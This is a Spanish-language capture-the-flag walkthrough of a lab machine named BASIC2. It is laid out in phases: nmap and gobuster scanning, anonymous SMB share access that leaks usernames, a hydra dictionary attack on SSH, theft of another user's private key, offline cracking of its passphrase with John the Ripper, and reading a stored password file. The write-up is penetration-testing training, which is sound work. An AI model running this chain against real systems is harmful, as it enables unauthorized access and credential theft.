--- FASE 1: ESCANEO DE SERVICIOS ---
# Descubrimiento de puertos, servicios y versiones
nmap -sC -sV <IP_OBJETIVO>

# Resultado: puertos abiertos
#   22/tcp   ssh    OpenSSH 8.2p1 (Ubuntu)
#   80/tcp   http   Apache httpd 2.4.41 (Ubuntu)
#   139/tcp  smb    Samba smbd 4.6.2
#   445/tcp  smb    Samba smbd 4.6.2
#   NetBIOS name: BASIC2

--- FASE 2: ENUMERACIÓN WEB ---
# La web (puerto 80) muestra solo "Undergoing maintenance".
# Búsqueda de directorios ocultos:
gobuster dir -u http://<IP_OBJETIVO> -w /usr/share/wordlists/dirb/common.txt

# Resultado relevante:
#   /development  (Status: 301)  -> directorio oculto accesible
# Dentro de /development: dev.txt y j.txt (notas internas del equipo).
# Las notas revelan usuarios con iniciales J y K, y mencionan que
# un usuario tiene una contraseña débil.

--- FASE 3: ENUMERACIÓN SMB ---
# Enumeración del servicio Samba:
enum4linux -A <IP_OBJETIVO>

# Hallazgos:
#   - Recurso compartido "Anonymous" accesible SIN credenciales.
#   - Política de contraseñas débil: longitud mínima 5, sin complejidad.

# Acceso al recurso compartido anónimo:
smbclient //<IP_OBJETIVO>/Anonymous
# (contraseña vacía -> Enter)
smb: \> ls
smb: \> get staff.txt
smb: \> exit

# Lectura del archivo obtenido:
cat staff.txt
# Resultado: filtra los usuarios del sistema -> "jan" y "kay"

--- FASE 4: EXPLOTACIÓN (FUERZA BRUTA SSH) ---
# Ataque de diccionario contra el usuario jan por SSH:
hydra -l jan -P /usr/share/wordlists/rockyou.txt <IP_OBJETIVO> ssh -t 4 -f
# Resultado: credencial obtenida -> usuario jan (acceso exitoso).

# Acceso remoto como jan:
ssh jan@<IP_OBJETIVO>

--- FASE 5: ESCALADA DE PRIVILEGIOS ---
# Enumeración de usuarios y carpetas:
ls -la /home
ls -la /home/kay/.ssh
# Hallazgo: clave privada id_rsa de kay con permisos de lectura
# para otros usuarios (mala configuración).

# Lectura y copia de la clave privada de kay:
cat /home/kay/.ssh/id_rsa   # (se copió a la máquina atacante)

# Crackeo offline de la passphrase de la clave con John the Ripper:
ssh2john kay_rsa > kay_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash.txt
# Resultado: passphrase de la clave obtenida.

# Acceso como kay usando la clave privada:
chmod 600 kay_rsa
ssh -i kay_rsa kay@<IP_OBJETIVO>

# Lectura de la contraseña final (post-explotación):
ls -la
cat pass.bak
# Resultado: contraseña final obtenida. Cadena de ataque completa.
